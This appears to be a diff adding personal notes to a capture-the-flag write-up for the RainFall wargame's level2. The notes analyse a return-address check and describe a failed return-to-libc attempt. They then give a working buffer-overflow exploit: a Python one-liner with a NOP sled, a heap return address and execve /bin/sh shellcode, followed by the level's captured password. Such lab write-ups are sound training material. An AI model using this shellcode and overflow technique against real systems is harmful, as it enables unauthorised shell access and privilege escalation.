@@ -11,5 +11,73 @@ this algo will apply almost to any binary file to collect info about:
 	breakpoints on addresses, 
 	info frame, set $<regname>=<value>)
 
+ 
+   0x080484fb <+39>:	and    $0xb0000000,%eax
+   0x08048500 <+44>:	cmp    $0xb0000000,%eax
+
+this piece of code restricts us to set eip to stack address
+
+converts in C in something like:
+(eip & 0xb0000000) == 0xb0000000 printf
+else puts
+
+rest of the code after comparison seems to be useless
+
+so we can try to set eip to 'ret' address to avoid rest of the code after comparison
+
+eip = &ret
+
+after execution of 'ret' eip will increment and start executing next command
+
+we can try to set eip + 1 to 'system' function with enviromental variable address 
+export EXPLOIT="/bin/sh"
+
+how to find out EXPLOIT address ? 
+
+we can right a piece of code:
+#include <stdlib.h>
+#include <stdio.h>
+
+int main() {
+	printf("%p\n", getenv("EXPLOIT"));
+return 0;
+}
+
+and pass it like a argument to the function system
+
+ret address: 0x0804853e
+system address: 0xb7e6b060
+EXPLOIT address: 0xbffff88b
+
+NOTE: we need to adjust where EXPLOIT argument should be written on stack
+
+
+SEG FAULT WAS CAUGHT
+
+Next way: 
+however we cant put into eip stack address we see strdup that returns heap allocated memory
+always the same
+
+we can set eip after gets to this allocated string and bytes of SHELLCODE
+SHELLCODE helps uses insn encoding bytes to enter /bin/sh
+just exactly what we need
+
+strdup return value is: 0x804a008
+
+
+so firstly there is a buffer with a size 76 
+to rewrite eip we need to enter 80 bytes (because there is a another pointer allocated on stack)
+and than hand written aligning to make shellcode work
+
+level2@RainFall:~$ python -c 'print "\x90" * 80 + "\x08\x04\xa0\x0c"[::-1] + "\x90" * 100 + "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"' | ./level2
+
+cat   /home/user/level3/.pass	
+492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
+
+
+
+
+
+
 
 
